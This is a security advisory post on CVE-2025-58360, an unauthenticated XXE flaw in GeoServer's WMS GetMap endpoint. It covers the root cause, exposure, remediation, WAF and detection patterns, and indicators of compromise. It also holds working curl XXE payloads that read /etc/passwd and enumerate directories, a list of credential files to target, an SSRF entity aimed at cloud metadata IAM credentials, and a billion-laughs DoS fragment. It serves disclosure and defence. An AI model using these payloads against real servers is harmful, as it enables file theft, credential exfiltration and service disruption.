---

# CVE-2025-58360: GeoServer WMS XXE Vulnerability Now on CISA KEV

**TL;DR:** An unauthenticated XXE vulnerability in GeoServer's WMS GetMap endpoint allows attackers to read arbitrary files, enumerate directories, perform SSRF, and cause DoS. CISA added it to the KEV catalog—meaning it's being exploited in the wild. Tens of thousands of instances are exposed. Patch now.

---

## Executive Summary

On November 25, 2025, the GeoServer project disclosed CVE-2025-58360, a high-severity XML External Entity (XXE) vulnerability affecting the Web Map Service (WMS) GetMap operation. The flaw requires no authentication, no user interaction, and is trivially exploitable with publicly available proof-of-concept code.

CISA has since added this vulnerability to its Known Exploited Vulnerabilities (KEV) catalog, signaling confirmed active exploitation and triggering mandatory remediation timelines for federal agencies under BOD 22-01.

---

## Vulnerability Details

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2025-58360 |
| **CWE** | CWE-611 (Improper Restriction of XML External Entity Reference) |
| **CVSS v3.1** | 8.2 (High) |
| **Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` |
| **Affected Versions** | ≤ 2.25.5, 2.26.0 – 2.26.1 |
| **Fixed Versions** | 2.25.6, 2.26.2, 2.26.3, 2.27.0 |
| **Authentication Required** | None |
| **Exploit Complexity** | Low |

### What is GeoServer?

GeoServer is an open-source server written in Java that enables users to share, process, and edit geospatial data. It implements Open Geospatial Consortium (OGC) standards including Web Map Service (WMS), Web Feature Service (WFS), and Web Coverage Service (WCS). GeoServer is widely deployed by government agencies, utilities, environmental organizations, and enterprises managing spatial data infrastructure.

### Root Cause

The vulnerability exists in how GeoServer's OWS dispatcher routes XML input to the SLD (Styled Layer Descriptor) parser. While the dispatcher itself configures an `AllowListEntityResolver` to block XXE, the downstream `SLDParser.parseSLD()` method creates its own parser instance without inheriting this protection.

```
POST /geoserver/ows?service=WMS&request=GetMap
     |
     v
+-----------------------------+
|   OWS Dispatcher            | <-- EntityResolver configured
|   (Detects SLD in body)     |
+-----------------------------+
     |
     v
+-----------------------------+
|   SLDXmlRequestReader       |
|   -> SLDHandler.parse()     |
|   -> SLDParser.parseSLD()   | <-- NO EntityResolver
+-----------------------------+
     |
     v
   XXE RESOLVED -> File/SSRF
```

**[SUGGESTION: Add a screenshot of the vulnerable code snippet in `SLDParser.java` or a debugger stack trace showing the lack of EntityResolver here.]**

When the parser processes a malicious XML document containing external entity declarations, it resolves those entities—reading local files, making outbound HTTP requests, or exhausting system resources.

---

## Attack Vectors

### 1. Arbitrary File Read (Error-Based Exfiltration)

The exploit leverages GeoServer's error handling to exfiltrate file contents. When an XXE payload substitutes file content into a layer name, GeoServer attempts to resolve it as a valid layer—failing with an error that leaks the data:

```bash
curl -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE StyledLayerDescriptor [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<StyledLayerDescriptor version="1.0.0">
  <NamedLayer>
    <Name>&xxe;</Name>
  </NamedLayer>
</StyledLayerDescriptor>' \
  "http://target:8080/geoserver/ows?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90"
```

**Vulnerable Response:**
```xml
<ServiceException>
  Unknown layer: root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
</ServiceException>
```

**Patched Response:**
```xml
<ServiceException>
  Entity resolution disallowed for file:///etc/passwd
</ServiceException>
```

High-value targets include:
```
file:///opt/geoserver_data/security/masterpw.info
file:///opt/geoserver_data/security/usergroup/default/users.xml
file:///opt/geoserver_data/global.xml
file:///etc/shadow (if running as root)
```

**[SUGGESTION: Add a screenshot of Burp Suite Repeater showing the request and the successful `/etc/passwd` or `/etc/shadow` response.]**

### 2. Directory Enumeration

A lesser-known XXE capability: Java's `file://` URI handler reads directories as newline-separated file lists. This enables full filesystem enumeration before targeting specific files:

```bash
# Payload with file:/// pointing to a directory
curl -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE StyledLayerDescriptor [
  <!ENTITY xxe SYSTEM "file:///">
]>
<StyledLayerDescriptor version="1.0.0">
  <NamedLayer>
    <Name>&xxe;</Name>
  </NamedLayer>
</StyledLayerDescriptor>' \
  "http://target:8080/geoserver/ows?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90"
```

**Response:**
```xml
<ServiceException>
  Unknown layer: bin
boot
dev
etc
home
lib
...
</ServiceException>
```

**[SUGGESTION: Add a screenshot showing the directory listing output in the response.]**

Attackers can recursively map the filesystem structure, identify sensitive paths, then surgically extract credentials and configuration.

### 3. Server-Side Request Forgery (SSRF)

XXE enables SSRF to probe internal networks or access cloud metadata endpoints:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

For GeoServer instances running on AWS, GCP, or Azure, this can leak IAM credentials, service account tokens, or instance metadata.

### 4. Denial of Service

Entity expansion attacks ("billion laughs") can exhaust memory and crash the service:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- Continue nesting... -->
]>
```

---

## Multiple Vulnerable Endpoints

Testing confirms XXE works against both the OWS dispatcher and direct WMS endpoint:

| Endpoint | Vulnerable |
|----------|------------|
| `/geoserver/ows` | Yes |
| `/geoserver/wms` | Yes |

The OWS dispatcher is the primary attack surface since it handles all OGC service requests.

---

## Internet Exposure

GeoServer's prevalence makes this vulnerability particularly concerning. Reconnaissance data indicates significant exposure:

| Source | Exposed Instances |
|--------|-------------------|
| Shodan | ~31,000 |
| ZoomEye | ~49,400 |
| FOFA | ~24,000 |

**[SUGGESTION: Add a screenshot of Shodan/ZoomEye/FOFA search results map or list to visualize the scale.]**

Many of these instances serve critical geospatial infrastructure for government mapping portals, environmental monitoring systems, urban planning applications, and utility asset management. GeoServer typically runs on port 8080 and often integrates with internal databases, file stores, and APIs—making it an attractive pivot point for lateral movement.

---

## Historical Context: GeoServer Under Attack

This isn't GeoServer's first appearance on CISA's KEV catalog. Just last year, in July 2024, CVE-2024-36401—a critical RCE vulnerability (CVSS 9.8) in GeoServer's XPath expression handling—was added to the KEV catalog after widespread exploitation.

Fortinet Threat Research reports that this vulnerability has been exploited in the wild to deliver APT-linked backdoors, botnet malware, and cryptocurrency miners.

Attack campaigns targeted government agencies in Taiwan, tele communications companies in Thailand & Brazil, IT service providers in India, and enterprises globally. The Earth Baxia APT group notably exploited CVE-2024-36401 in spear-phishing campaigns against APAC targets.

The pattern is clear: GeoServer vulnerabilities attract both financially motivated criminals (cryptojacking) and state-sponsored actors (espionage). CVE-2025-58360's addition to the KEV catalog suggests similar exploitation is already underway.

---

## Discovery & Disclosure

CVE-2025-58360 was discovered by XBOW, an AI-powered autonomous vulnerability discovery system. According to the advisory:

> *"This vulnerability was detected using XBOW, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission."*

The coordinated disclosure resulted in same-day patch availability—credit to the GeoServer team for rapid response.

**Timeline:**

| Date | Event |
|------|-------|
| Pre-Nov 2025 | Discovered by XBOW |
| November 25, 2025 | Coordinated disclosure, patches released |
| November 25, 2025 | CVE assigned and published |
| Early December 2025 | Added to CISA KEV catalog |
| December 11, 2025 | NVD last modified |

---

## Remediation

### Patch Immediately

Upgrade to a fixed version:

- **2.25.x branch:** Update to 2.25.6
- **2.26.x branch:** Update to 2.26.2 or 2.26.3
- **Latest stable:** Update to 2.27.0+

Docker users:
```bash
docker pull osgeo/geoserver:2.27.0
```

### Interim Mitigations

If immediate patching isn't possible:

1. **WAF Rules:** Block requests containing `<!ENTITY` or `SYSTEM "file://` patterns
2. **Disable Dynamic Styling:** If `SLD_BODY` functionality isn't required, disable it in WMS settings
3. **Network Segmentation:** Restrict GeoServer access to trusted networks; never expose directly to the internet without authentication
4. **Reverse Proxy:** Strip or sanitize XML bodies from unauthenticated requests
5. **Least Privilege:** Run GeoServer with minimal filesystem permissions

### Detection

**Vulnerable Server Indicators (in logs/responses):**
```
java.io.FileNotFoundException: /path/to/file
Unknown layer: [file contents appear here]
```

**Patched Server Indicators:**
```
Entity resolution disallowed for file:///path
org.xml.sax.SAXException: Entity resolution disallowed
```

Monitor for:

- POST requests to `/geoserver/ows` or `/geoserver/wms` with XML bodies
- XML payloads containing `<!DOCTYPE`, `<!ENTITY`, or `SYSTEM` declarations
- Outbound connections from GeoServer to internal metadata services (169.254.169.254)
- Unexpected file access patterns in GeoServer's process

---

## Indicators of Compromise

Public PoC code and Nuclei templates are circulating. Look for requests matching:

```
POST /geoserver/ows?service=WMS&request=GetMap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE StyledLayerDescriptor [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
...
```

GeoServer access logs and WAF alerts should be reviewed for anomalous WMS GetMap requests, particularly those with inline XML styling.

---

## Key Takeaways

1. **Patch urgently.** CISA KEV inclusion means confirmed exploitation in the wild. Federal agencies have mandated remediation deadlines; private sector should treat this as critical priority.

2. **Reduce attack surface.** GeoServer instances should not be directly internet-exposed without authentication and WAF protection.

3. **XXE is alive and well.** Despite being a well-understood vulnerability class, XXE continues appearing in production software. XML parsers must explicitly disable external entity resolution.

4. **GeoServer demands security attention.** Two major vulnerabilities added to KEV within 18 months signals that this platform is under active attacker interest. Treat it as critical infrastructure.

5. **Automated discovery is accelerating.** AI-powered vulnerability scanners like XBOW are finding bugs faster. Defenders must keep pace with patching cadence.

---

## References

- [GitHub Security Advisory (GHSA-fjf5-xgmq-5525)](https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525)
- [NVD - CVE-2025-58360](https://nvd.nist.gov/vuln/detail/CVE-2025-58360)
- [GeoServer Issue Tracker (GEOS-11682)](https://osgeo-org.atlassian.net/browse/GEOS-11682)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [GeoServer 2.28.1 Release Notes](https://geoserver.org/announcements/vulnerability/2025/11/25/geoserver-2-28-1-released.html)

---

*If you run GeoServer, the time to patch was yesterday. The window between disclosure and mass exploitation shrinks with every public PoC.*

---

**Key updates from lab testing:**
- Added root cause diagram showing the vulnerable code path (OWS Dispatcher → SLDParser bypass)
- Replaced generic XXE payload with confirmed working exploit against `/geoserver/ows`
- Added directory enumeration technique (Java file:// reads directories as file lists)
- Added table showing both `/geoserver/ows` and `/geoserver/wms` are vulnerable
- Added detection signatures differentiating vulnerable vs patched responses
- Updated IoC section with accurate request format